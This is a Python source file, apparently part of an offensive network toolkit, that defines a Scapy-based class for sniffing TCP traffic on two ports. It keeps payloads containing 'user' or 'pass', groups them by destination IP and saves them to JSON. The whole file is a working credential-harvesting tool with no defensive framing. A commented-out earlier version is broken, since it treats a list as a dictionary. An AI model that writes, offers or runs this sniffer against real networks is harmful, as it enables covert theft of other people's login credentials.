import datetime
import json
from scapy.all import sniff, TCP, IP
from .output import write_output_to_json_file

class Sniffer:
    """
    This class provides methods for sniffing network traffic on specified ports and capturing
    packets that may contain credentials.

    Attributes:
    - port1: First port to sniff.
    - port2: Second port to sniff.
    - results: Dictionary to store captured packets.

    Methods:
    1. __init__(self, port1, port2):
        - Initializes the instance with the specified ports and an empty results dictionary.

    2. packet_callback(self, packet):
        - Callback method to process each packet during sniffing.
        - Checks for the presence of 'user' or 'pass' in the packet payload.
        - Stores the payload along with the destination IP address in the results dictionary.

    3. sniff_for_credentials(self):
        - Sniffs network traffic on the specified ports and captures packets containing credentials.
        - Returns the results dictionary.
    """
    def __init__(self, port1, port2):
        self.port1 = port1
        self.port2 = port2
        self.results = {}

    def packet_callback(self, packet):
        if packet[TCP].payload:
            mypacket = str(packet[TCP].payload)
            if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
                destination_ip = packet[IP].dst
                payload = str(packet[TCP].payload)

                if destination_ip in self.results:
                    self.results[destination_ip].append(payload)
                else:
                    self.results[destination_ip] = [payload]

    def sniff_for_credentials(self):
        sniff(filter=f'tcp port {self.port1} or tcp port {self.port2}',
              prn=self.packet_callback, store=0)
        write_output_to_json_file("snifferCredentials", self.results)
        return self.results

# def sniff_for_credentials(port1, port2):
#     results = []

#     # Maybe change the scope of this so i can say what i want to sniff ..?
#     def packet_callback(packet):
#         if packet[TCP].payload:
#             mypacket = str(packet[TCP].payload)
#             if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
#                 destination_ip = packet[IP].dst
#                 payload = str(packet[TCP].payload)

#                 if destination_ip in results:
#                     results[destination_ip].append(payload)
#                 else:
#                     results[destination_ip] = [payload]

#     sniff(filter=f'tcp port {port1} or tcp port {port2}',
#           prn=packet_callback, store=0)

#     return results


if __name__ == "__main__":
        sniffer = Sniffer(port1=80, port2=443)
        credentials = sniffer.sniff_for_credentials()
        print(credentials)